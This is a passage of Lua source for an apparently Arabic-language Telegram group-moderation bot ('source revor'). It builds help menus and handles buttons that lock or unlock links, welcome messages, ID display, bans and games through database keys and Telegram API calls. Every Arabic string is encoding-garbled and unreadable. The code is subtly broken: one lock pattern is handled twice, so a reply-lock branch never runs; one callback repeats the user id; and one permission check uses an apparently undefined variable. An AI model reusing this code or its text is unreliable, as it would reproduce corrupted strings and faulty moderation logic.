Ψ§ΩΨ§ΩΨ―Ω\nΩ­ Ψ§Ψ°Ψ§ΨΉΩ \nΩ­ Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ\nΩ­ Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ \nΩ­ Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ \nΩ­ Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ \nβ β β β β β β β β\n\n[source revor](t.me/Revorb0t)β’\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help6') then
if tonumber(Text:match('(.*)/help6')) == tonumber(data.sender_user_id_) then

local Tww = 'Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ³ΩΩΩ\nβ β β β β β β β β\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ¨\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΩΨ§Ψ¨\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ²ΩΨ¬ΨͺΩ\nΩ­ ΩΨ³Ψ­ Ψ§ΩΨ²ΩΨ¬Ψ§Ψͺ\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ±Ψ―\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΨ±ΩΨ―\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ­ΩΨ§Ψ±\nΩ­ ΩΨ³Ψ­ Ψ§ΩΨ­ΩΩΨ±\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨͺΨ?Ψ²ΩΩ\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΨͺΨ?Ψ²ΩΩΩΩ\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨͺΩΨ­Ψ―\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨͺΩΩ\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ§Ψͺ\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ²Ω\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΨ²Ψ²\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ­ΩΨ§Ω\nΩ­ ΩΨ³Ψ­ Ψ§ΩΨ­ΩΨ§ΩΩΩ\nΩ­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ?ΩΩ\nΩ­ ΩΨ³Ψ­ Ψ§ΩΨ?ΩΩΨ§Ψͺ\nΩ­ Ψ±ΩΨΉ Ψ¨ΩΩΨ¨Ω / ΨͺΩΨ²ΩΩ ΩΩ ΩΩΨ¨Ω\nΩ­ ΩΨ³Ψ­ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω\nβ β β β β β β β β\n\n[source revor](t.me/Revorb0t)β’\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help') and Admin(mahh) then
if tonumber(Text:match('(.*)/help')) == tonumber(data.sender_user_id_) then

local Tww = 'β β  ββ source revor ββ  β β\n \n*β  Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ*\n*β‘ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ*\n*β’ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘*\n*β£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩΩ*\n*β€ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ±ΩΩ*\n*β₯ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ³ΩΩΩ*\nβ β β β β β β β\n\n[Ω­ source revor](t.me/Revorb0t)β’\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=data.sender_user_id_.."/help1"},{text = 'β‘', callback_data=data.sender_user_id_.."/help2"},{text = 'β’', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=data.sender_user_id_.."/help4"},{text = 'β€', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=data.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end

if Text and Text:match('(.*)/lockdul') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockdul')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ '
database:set(bot_id..'dw:bot:api'..Chat_id,true) 
database:set(bot_id..'dw:bot:api'..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lock_links') and Admin(data) then
if tonumber(Text:match('(.*)/lock_links')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ· '
database:del(bot_id.."Link_Group"..Chat_id) 
database:del(bot_id.."Link_Group"..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockwelcome') and Admin(data) then
if tonumber(Text:match('(.*)/lockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ '
database:del(bot_id.."Chek:Welcome"..Chat_id) 
database:del(bot_id.."Chek:Welcome"..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockwelcome') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ '
database:set(bot_id.."Reply:Sudo"..Chat_id,true) 
database:set(bot_id.."Reply:Sudo"..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockide') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockide')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω '
database:set(bot_id..'Lock:ID:Bot'..Chat_id,true) 
database:set(bot_id..'Lock:ID:Bot'..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockidephoto') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockidephoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω '
database:set(bot_id..'Lock:ID:Bot:Photo'..Chat_id,true) 
database:set(bot_id..'Lock:ID:Bot:Photo'..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockkiked') and Creator(data) then
if tonumber(Text:match('(.*)/lockkiked')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± '
database:set(bot_id.."Add:Group:Cheking"..Chat_id,"true")
database:set(bot_id.."Add:Group:Cheking"..qqff,"true")
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/locksetm') and Creator(data) then
if tonumber(Text:match('(.*)/locksetm')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ '
database:set(bot_id.."Add:Group:Cheking"..Chat_id,"true")
database:set(bot_id.."Add:Group:Cheking"..qqff,"true")
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockkikedme') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockkikedme')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ '
database:set(bot_id.."Cick:Me"..Chat_id,true) 
database:set(bot_id.."Cick:Me"..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockgames') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockgames')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ '
database:del(bot_id.."Tshak:Lock:Games"..Chat_id) 
database:del(bot_id.."Tshak:Lock:Games"..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockrepgr') and OwnerSs(data) then
if tonumber(Text:match('(.*)/lockrepgr')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― '
database:set(bot_id.."Reply:Manager"..Chat_id,true) 
database:set(bot_id.."Reply:Manager"..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/unlockdul') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockdul')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ²ΩΩ '
database:del(bot_id..'dw:bot:api'..Chat_id) 
database:del(bot_id..'dw:bot:api'..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlock_links') and Admin(data) then
if tonumber(Text:match('(.*)/unlock_links')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ· '
database:set(bot_id.."Link_Group"..Chat_id,true) 
database:set(bot_id.."Link_Group"..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockwelcome') and Admin(data) then
if tonumber(Text:match('(.*)/unlockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ '
database:set(bot_id.."Chek:Welcome"..Chat_id,true) 
database:set(bot_id.."Chek:Welcome"..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockrepall') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockrepall')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ '
database:del(bot_id.."Reply:Sudo"..Chat_id) 
database:del(bot_id.."Reply:Sudo"..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockide') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockide')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω '
database:del(bot_id..'Lock:ID:Bot'..Chat_id) 
database:del(bot_id..'Lock:ID:Bot'..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockidephoto') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockidephoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω '
database:del(bot_id..'Lock:ID:Bot:Photo'..Chat_id) 
database:del(bot_id..'Lock:ID:Bot:Photo'..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockkiked') and Creator(data) then
if tonumber(Text:match('(.*)/unlockkiked')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ± '
database:del(bot_id.."Ban:Cheking"..Chat_id)
database:del(bot_id.."Ban:Cheking"..qqff)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlocksetm') and Creator(data) then
if tonumber(Text:match('(.*)/unlocksetm')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ '
database:set(bot_id.."Add:Group:Cheking"..Chat_id,"true")
database:set(bot_id.."Add:Group:Cheking"..qqff,"true")
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockkikedme') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockkikedme')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ '
database:del(bot_id.."Cick:Me"..Chat_id) 
database:del(bot_id.."Cick:Me"..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockgames') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockgames')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ '
database:set(bot_id.."Tshak:Lock:Games"..Chat_id,true) 
database:set(bot_id.."Tshak:Lock:Games"..qqff,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockrepgr') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockrepgr')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― '
database:del(bot_id.."Reply:Manager"..Chat_id) 
database:del(bot_id.."Reply:Manager"..qqff) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/homeaddrem') and OwnerSs(data) then
if tonumber(Text:match('(.*)/homeaddrem')) == tonumber(data.sender_user_id_) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΨΉΨ·ΩΩ ΩΨͺΩΨΉΩΩ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/lock_links"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/unlock_links"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=data.sender_user_id_.."/lockwelcome"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=data.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockrepall"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockrepall"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=data.sender_user_id_.."/lockide"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=data.sender_user_id_.."/unlockide"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=data.sender_user_id_.."/lockidephoto"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=data.sender_user_id_.."/unlockidephoto"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=data.sender_user_id_.."/lockkiked"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=data.sender_user_id_.."/unlockkiked"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=data.sender_user_id_.."/locksetm"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=data.sender_user_id_.."/unlocksetm"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=data.sender_user_id_.."/lockkikedme"},{text = 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=data.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=data.sender_user_id_.."/lockgames"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=data.sender_user_id_.."/unlockgames"},{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=data.sender_user_id_..data.sender_user_id_.."/lockrepgr"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=data.sender_user_id_.."/unlockrepgr"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Texti)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
